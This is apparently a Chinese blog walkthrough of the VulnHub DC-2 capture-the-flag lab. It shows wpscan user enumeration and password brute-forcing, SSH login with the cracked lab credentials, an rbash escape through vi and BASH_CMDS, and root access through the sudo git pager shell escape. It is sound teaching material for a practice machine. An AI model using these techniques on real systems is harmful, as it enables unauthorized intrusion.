# DC-2

写写自己打DC-2的过程

使用工具 kali

> DC-2的靶机下载地址为：<https://www.vulnhub.com/entry/dc-2,311/>

### 环境配置。

我这里的话kali和DC-2都是nat模式

![1637323951_619794af4ca13b90b7e5e.png!small?1637323950565](https://image.3001.net/images/20211119/1637323951_619794af4ca13b90b7e5e.png!small?1637323950565)

kali IP为:192.168.28.139

DC-2 IP设置为nat模式，具体多少暂时也不知道。

### 信息收集

    
    
    查找 DC-2 IP  
    arp-scan -l

![image-20211129205442973.png](https://image.3001.net/images/20211130/1638234597_61a579e5841d7403b8e37.png!small)

得到DC-2 IP为：192.168.28.179

    
    
    扫描开启的端口  
    nmap -A -p1-65535 198.13.51.49

![image-20211129205651497](https://image.3001.net/images/20211130/1638234598_61a579e68fba9065036ad.png!small)

可以看到DC-2开启了80端口和 改了ssh默认端口 改成了7744端口

### FLAG1

尝试访问一下DC-2:192.168.28.179

![image-20211129210220889](https://image.3001.net/images/20211130/1638234599_61a579e79ba17650f3f8d.png!small)

本地访问不了会自动跳到DC-2。应该是给重定向了！

我们本地dns绑定下

    
    
    可以访问本地hosts  
    C:\Windows\System32\drivers\etc  
    修改hosts文件  
    修改不了的话，右键属性 取消只读 保存就可以了

![image-20211129210536299](https://image.3001.net/images/20211130/1638234600_61a579e86b0c614cc3934.png!small)

添加这样子的一条

重新访问就进去了

![image-20211129210612768](https://image.3001.net/images/20211130/1638234601_61a579e972b1959675867.png!small)

仔细观察看到右下角有一个FLAG1

### FLAG2

提示：“Your usual wordlists probably won’t work, so instead, maybe you just need
to be cewl.”

意思应该就是用cewl

    
    
    Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。

遇事不决先扒下字典看看有啥。

    
    
    cewl http://dc-2 -w passwd.txt

![image-20211129212549829](https://image.3001.net/images/20211130/1638234606_61a579ee41f1e115245b0.png!small)

ps:本来用 cewl <http://192.168.28.179>-w passwd.txt
的但是没有任何输出，想想应该是ip给重定向了，用域名就可以了。

可以大概查看下字典

![image-20211129212734745](https://image.3001.net/images/20211130/1638234606_61a579eef29b3aebcd19e.png!small)

有了密码字典 还需要找账号和登录框。

挖挖目录看看

用dirb来挖目录

    
    
    dirb http://dc-2

![image-20211129213203311](https://image.3001.net/images/20211130/1638234608_61a579f00333779efe972.png!small)

想要登录框，admin.php非常有可能。我们去访问

    
    
    http://dc-2/wp-admin/admin.php

![image-20211129213350808](https://image.3001.net/images/20211130/1638234608_61a579f0e250d79a928f2.png!small)

网站我们拿到了 还需要账号

这一看就是Wordpress。

Wordpress有一个著名的扫描工具wpscan

缺用户名那么我们就

    
    
    wpscan --url http://dc-2/ -e u      //枚举用户名字

![image-20211129214851066](https://image.3001.net/images/20211130/1638234609_61a579f1bfc4e139ee9ef.png!small)

![image-20211129214912883](https://image.3001.net/images/20211130/1638234610_61a579f2a0ff652f8185c.png!small)

保存枚举出来的3个账号

    
    
    admin  
    jerry  
    tom

![image-20211129215041533.png](https://image.3001.net/images/20211130/1638234611_61a579f38b43832f27105.png!small)

完成后。使用wpscan爆破账号密码

    
    
    wpscan --url http://dc-2/ -U user.txt -P passwd.txt

![image-20211129215409687](https://image.3001.net/images/20211130/1638234612_61a579f45889d3feef5ab.png!small)

![image-20211129215436137](https://image.3001.net/images/20211130/1638234613_61a579f53dc75841b2ad1.png!small)

可以看到出来了两组密码

    
    
    jerry / adipiscing                                                                         
    tom / parturient  

登录登录！！

![image-20211129215655108](https://image.3001.net/images/20211130/1638234614_61a579f64355fabec87b7.png!small)

![image-20211129215842498](https://image.3001.net/images/20211130/1638234615_61a579f7132e4d1b9d279.png!small)

登录成功！

ps：上面url有时候不会跳到<http://dc-2/wp-admin/>导致登录后空白，可以登录后输入url 就可以进去了。

仔细找找多点点FLAG就出来了

![image-20211129220034860](https://image.3001.net/images/20211130/1638234616_61a579f81b6424152e0da.png!small)

![image-20211129220042963](https://image.3001.net/images/20211130/1638234616_61a579f8ea390c95187ef.png!small)

### FLAG3

提示:“If you can't exploit WordPress and take a shortcut, there is another
way.Hope you found another entry point.”

和我们说WordPress找不到其他东西了

然后就想起来了前面还有个ssh改端口的改成了7744

然后也了个WordPress的账号密码，可以尝试登录下

    
    
    ssh jerry@192.168.28.179 -p 7744 

![image-20211129220548004](https://image.3001.net/images/20211130/1638234617_61a579f9a9c447747a03d.png!small)

jerry试了3次都不行怀疑人生。

然后就用tom测试 发现可以登录

    
    
    ssh tom@192.168.28.179 -p 7744 

![image-20211129220719240](https://image.3001.net/images/20211130/1638234618_61a579fa8bebbfd27664b.png!small)

成功登录

    
    
    ls             //查看当前文件

![image-20211129220812003](https://image.3001.net/images/20211130/1638234620_61a579fc7761eb9cdede3.png!small)

发现flag3.txt

    
    
    cat flag3.txt

发现命令没办法用

被“rbash”限制了

![image-20211129220835046](https://image.3001.net/images/20211130/1638234621_61a579fd0d185f30eaa9c.png!small)

查看可以使用的指令

    
    
    compgen -c       //查看可以使用的指令

![image-20211129221118727](https://image.3001.net/images/20211130/1638234622_61a579fea5e0faba7167b.png!small)

仔细查看发现了

![image-20211129221233767](https://image.3001.net/images/20211130/1638234623_61a579ff9380a233c0994.png!small)

下面有一个vi

    
    
    vi falg3.txt

![image-20211129221820672](https://image.3001.net/images/20211130/1638234624_61a57a002abc240987de9.png!small)

![image-20211129221831169](https://image.3001.net/images/20211130/1638234624_61a57a00cd6d4d1007f7f.png!small)

发现flag3

### FLAG4

提示:"Poor old Tom is always running after Jerry. Perhaps he should su for all
the stress he causes."

提到了tom和jerry和su

应该是让我们提权，然后去看看jerry和su

vi可以用 有一个vi的提权

    
    
    vi随便打开文件  
    再下面添加  
    :set shell=/bin/sh  
    :shell

![image-20211129222346618](https://image.3001.net/images/20211130/1638234625_61a57a018801ed170c044.png!small)

部分提权成功

    
    
    cd ..                //返回上级目录  
    ls                   

![image-20211129222619756](https://image.3001.net/images/20211130/1638234626_61a57a0232c163d61393e.png!small)

发现了jerry

    
    
    cd jerry          //进入jerry  
    ls                //查看当前文件

![image-20211129222809608](https://image.3001.net/images/20211130/1638234626_61a57a02c34437ce889c6.png!small)

发现了flag4

直接vi查看

    
    
    vi flag4.txt

![image-20211129222852567](https://image.3001.net/images/20211130/1638234627_61a57a0377eed5b47bb7a.png!small)

获得flag4

### FLAG5

提示：”Good to see that you've made it this far - but you're not home yet.You
still need to get the final flag (the only flag that really counts!!!).No
hints here - you're on your own now. :-)Go on - git outta here!!!!“

感觉没用

前面FLAG3有提示su。我们去看看root目录

想直接切去root目录

![image-20211129223514286](https://image.3001.net/images/20211130/1638234628_61a57a043fe4e03881e63.png!small)

切不了

想登录jerry 也发现没办法用su命令

找到了个rbash环境变量的提权方法

    
    
    export -p        //查看环境变量  
    BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a  
    /bin/bash  
    export PATH=$PATH:/bin/         //添加环境变量  
    export PATH=$PATH:/usr/bin      //添加环境变量  
    ​  
    提权成功

![image-20211129232734911](https://image.3001.net/images/20211130/1638234628_61a57a04ca9324b917407.png!small)

发现还是进不去root目录

    
    
    find / -perm -u=s -type f 2>/dev/null

![image-20211129233649386](https://image.3001.net/images/20211130/1638234629_61a57a05a7e8268b725ae.png!small)

看到有个sudo。我们看看啥有sudo权限的

    
    
    sudo -l

![image-20211129233735263](https://image.3001.net/images/20211130/1638234630_61a57a0681bc0811e62fd.png!small)

git是root权限

我们使用git提权

    
    
    (我们需要将shell的窗口变窄,使得回显信息不能一页显示)  
    1、sudo git help config #在末行命令模式输入   
    !/bin/bash 或 !'sh' #完成提权   
    2、sudo git -p help   
    !/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell

![image-20211129234140574](https://image.3001.net/images/20211130/1638234631_61a57a072a974f84a3c01.png!small)

提权成功 获得root权限，切换到root目录下

查看flag5(final-flag.txt)

![image-20211129234210909](https://image.3001.net/images/20211130/1638234631_61a57a07d31d76554c12a.png!small)

### 总结

    
    
    1.重定向  
    2.cewl使用  
    3.wpscan使用  
    4.rbash提权  
    5.git提权

